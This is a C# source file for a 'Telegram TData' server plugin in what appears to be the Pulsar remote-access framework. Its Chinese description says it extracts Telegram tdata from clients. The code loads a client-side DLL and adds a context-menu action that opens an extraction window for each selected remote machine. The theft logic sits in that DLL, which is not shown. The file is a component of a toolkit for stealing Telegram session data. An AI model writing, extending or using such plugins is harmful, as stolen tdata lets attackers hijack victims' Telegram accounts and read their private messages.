using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Pulsar.Server.Networking;
using Pulsar.Server.Plugins;

namespace Pulsar.Server.Plugins.TelegramTData
{
    public sealed class TelegramTDataPlugin : IServerPlugin
    {
        public string Name => "Telegram TData";
        public Version Version => new Version(1, 0, 0, 0);
        public string Description => "从客户端提取Telegram tdata";
        public string Type => "information";
        public bool AutoLoadToClients => false;

        private IServerContext _context;
        private string _pluginDir;
        private byte[] _clientDll;

        public void Initialize(IServerContext context)
        {
            _context = context;
            _pluginDir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) ?? AppDomain.CurrentDomain.BaseDirectory;
            _clientDll = LoadClientDll();

            context.AddClientContextMenuItem(new[] { "Telegram" }, "Telegram TData", LoadMenuIcon(), OnOpenTDataWindow);
            context.Log("Telegram TData插件已初始化");
        }

        private static Icon LoadMenuIcon()
        {
            try
            {
                var resources = new ComponentResourceManager(typeof(FrmTelegramTData));
                return resources.GetObject("$this.Icon") as Icon;
            }
            catch
            {
                return null;
            }
        }

        public void Dispose()
        {
        }

        private byte[] LoadClientDll()
        {
            try
            {
                var path = Path.Combine(_pluginDir, "Pulsar.Client.Plugins.TelegramTData.Client.dll");
                if (!File.Exists(path))
                {
                    _context?.Log($"Client DLL not found: {path}");
                    return null;
                }
                var data = File.ReadAllBytes(path);
                _context?.Log($"Loaded client DLL: {data.Length} bytes");
                return data;
            }
            catch (Exception ex)
            {
                _context?.Log($"Error loading client DLL: {ex.Message}");
                return null;
            }
        }

        internal byte[] GetClientDll()
        {
            if (_clientDll == null || _clientDll.Length == 0)
                _clientDll = LoadClientDll();
            return _clientDll;
        }

        private void OnOpenTDataWindow(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0)
            {
                MessageBox.Show("未选择客户端。", "Telegram TData", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (GetClientDll() == null)
            {
                MessageBox.Show("插件目录中未找到客户端DLL。", "Telegram TData", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            foreach (var client in clients)
            {
                var form = FrmTelegramTData.CreateNewOrGetExisting(client, this);
                form.Show();
                form.Focus();
            }
        }
    }
}
